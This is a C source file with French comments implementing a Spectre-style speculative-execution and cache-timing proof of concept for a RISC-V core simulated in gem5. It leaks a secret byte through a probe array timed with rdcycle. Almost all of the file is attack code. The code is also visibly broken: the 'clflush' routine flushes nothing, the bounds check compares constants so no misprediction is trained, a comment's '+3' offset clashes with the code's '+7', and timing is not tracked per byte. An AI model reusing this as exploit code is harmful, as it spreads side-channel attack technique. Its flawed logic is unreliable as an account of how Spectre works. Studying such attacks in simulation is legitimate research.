#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>

// -----------------------------------------------------
// 1. DÉFINITIONS ET INTRINSICS
// -----------------------------------------------------

#define PROBE_OFFSET 4096
#define PROBE_ARRAY_SIZE 256
const int NUM_ITERATIONS = 5000;

// Lecture du Compteur de Cycles (rdcycle)
static inline uint64_t read_cycle_counter() {
    uint64_t cycle;
    __asm__ volatile ("rdcycle %0" : "=r" (cycle));
    return cycle;
}

// Instruction de barrière (Fence) pour sérialiser les accès.
static inline void fence_serialise() {
    __asm__ volatile ("fence iorw, iorw" ::: "memory");
}

// Implémentation simplifiée de clflush (utilisée pour la sémantique,
// l'éjection réelle se fait principalement par pollution dans gem5)
static inline void clflush(volatile void* addr) {
    __asm__ volatile ("li t0, 0x0; fence" ::: "memory");
}


// -----------------------------------------------------
// 2. STRUCTURE D'ATTAQUE
// -----------------------------------------------------

// Tableau d'espionnage (Probe Array) : 256 lignes de 4096 octets chacune
uint8_t probe_array[PROBE_ARRAY_SIZE * PROBE_OFFSET];

// Secret et cible
volatile char secret_value = 0xAA; // NOUVEAU SECRET : 0xAA (170)
volatile uint8_t target_array[1024] = {0}; // Tableau cible
const size_t array_size = 5; // Taille correcte du tableau
const size_t target_offset = 200; // Index hors limites (> 5)

// Pointeur vers le secret
volatile char *secret_ptr = (volatile char *)&secret_value;


// -----------------------------------------------------
// 3. LOGIQUE D'ATTAQUE ET MESURE
// -----------------------------------------------------

void read_speculative() {
    // 1. Déclenchement de la mauvaise prédiction
    if (target_offset < array_size) {

        // 2. Accès spéculatif à l'octet secret
        // CORRECTION DE L'ERREUR D'ALIGNEMENT/OCTET ADJACENT :
        // Nous décalons l'adresse d'un octet (ici +3) pour voir si le secret est à l'adresse suivante.
        uint8_t value = *(uint8_t *)(secret_ptr + 7);

        // 3. Utilisation spéculative du secret pour fuir via le cache
        // L'octet lu (value) est utilisé comme index.
        volatile int temp = probe_array[value * PROBE_OFFSET];
    }
}


uint64_t time_access(volatile void *addr) {
    uint64_t start, end;

    fence_serialise();
    start = read_cycle_counter();

    // Accès mémoire (Hit ou Miss)
    volatile int temp = *(volatile int *)addr;

    fence_serialise();
    end = read_cycle_counter();

    return end - start;
}


int main() {
    uint64_t min_time = ULLONG_MAX;
    int found_byte = -1;

    printf("Simulation Spectre pour RISC-V O3 (gem5) - Secret : 0x%X\n", (uint8_t)secret_value);

    // 1. Initialisation et Flush initial du tableau d'espionnage
    for (int i = 0; i < PROBE_ARRAY_SIZE; i++) {
        probe_array[i * PROBE_OFFSET] = 1;
        clflush(&probe_array[i * PROBE_OFFSET]);
    }

    printf("--- Phase d'Espionnage et Mesure ---\n");

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        // 2. Flush du tableau à chaque itération
        for (int j = 0; j < PROBE_ARRAY_SIZE; j++) {
            clflush(&probe_array[j * PROBE_OFFSET]);
        }

        // 3. Exécuter l'attaque pour polluer le cache
        read_speculative();

        // 4. Phase de Mesure (Lecture du tableau d'espionnage)
        for (int j = 0; j < PROBE_ARRAY_SIZE; j++) {
            uint64_t time = time_access(&probe_array[j * PROBE_OFFSET]);

            // Trouver le temps minimal pour la fuite la plus rapide (Hit)
            if (time < min_time) {
                min_time = time;
                found_byte = j;
            }
        }
    }

    // 5. Afficher le résultat
    if (found_byte != -1) {
        printf("Secret potentiel trouvé : 0x%X ('%c') (Temps : %llu cycles)\n",
               found_byte, (char)found_byte, (unsigned long long)min_time);
    } else {
        printf("Aucun secret clair trouvé.\n");
    }

    return 0;
}
